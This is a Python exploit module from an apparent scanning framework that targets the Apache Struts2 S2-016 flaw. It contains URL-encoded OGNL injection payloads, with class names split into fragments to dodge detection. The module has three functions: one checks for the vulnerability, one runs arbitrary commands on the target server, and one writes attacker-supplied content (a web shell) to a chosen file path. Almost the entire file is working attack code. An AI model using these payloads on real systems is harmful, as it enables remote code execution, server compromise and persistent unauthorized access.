#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'Struts2-016'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-016'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.url != None:
            try:
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                prove_poc = "redirect%3a%24%7b%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().print(%22struts2_se%22%2b%22curity_vul%22)%2c%23resp.getWriter().print(%22struts2_security_vul_str2016%22)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()%7d"
                poc_key = '''struts2_security_vul'''
                res = self.curl('get',self.url, data=prove_poc,headers = headers)
                if res and res.text.find(poc_key) != -1 or poc_key in res.headers :
                    self.flag = 1
                    self.req.append({"poc": prove_poc})
                    self.res.append({"info": self.url, "key": "struts2_016"})
            except:
                pass

    def exec(self):
        self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            prove_poc = "redirect%3a%24%7b%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23s%3dnew+java.util.Scanner((new+java.lang.ProcessBuilder(%27%COMMAND%%27.toString().split(%27%5c%5c%5c%5cs%27))).start().getInputStream()).useDelimiter(%27%5c%5c%5c%5cAAAA%27)%2c%23str%3d%23s.hasNext()%3f%23s.next()%3a%27%27%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().println(%23str)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()%7d".replace("%COMMAND%",cmd)
            try:
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                content = self.curl('get', self.url, data=prove_poc, headers=headers).text
                self.flag = 1
                self.req.append({"headers": prove_poc})
                self.res.append({"info": content,"key":cmd})
            except:
                pass

    def upload(self):
        self.get_url()
        if self.url != None:
            despath = self.parameter['despath']
            srcpath = self.parameter['srcpath']
            content = self.read_file(srcpath['srcpath'])
            prove_poc = "redirect%3a%24%7b%23req%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27)%2c%23res%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27)%2c%23res.getWriter().print(%22oko%22)%2c%23res.getWriter().print(%22kok%2f%22)%2c%23res.getWriter().print(%23req.getContextPath())%2c%23res.getWriter().flush()%2c%23res.getWriter().close()%2cnew+java.io.BufferedWriter(new+java.io.FileWriter(%22%PATH%%22)).append(%23req.getParameter(%22shell%22)).close()%7d&shell=%FILECONTENT%".replace("%PATH%", despath).replace("%FILECONTENT%", content)
            try:
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                self.curl('get', self.url , data=prove_poc, headers=headers)
                self.flag = 1
                self.req.append({"poc": prove_poc})
                self.res.append({"info": despath,"key":"upload"})
            except:
                pass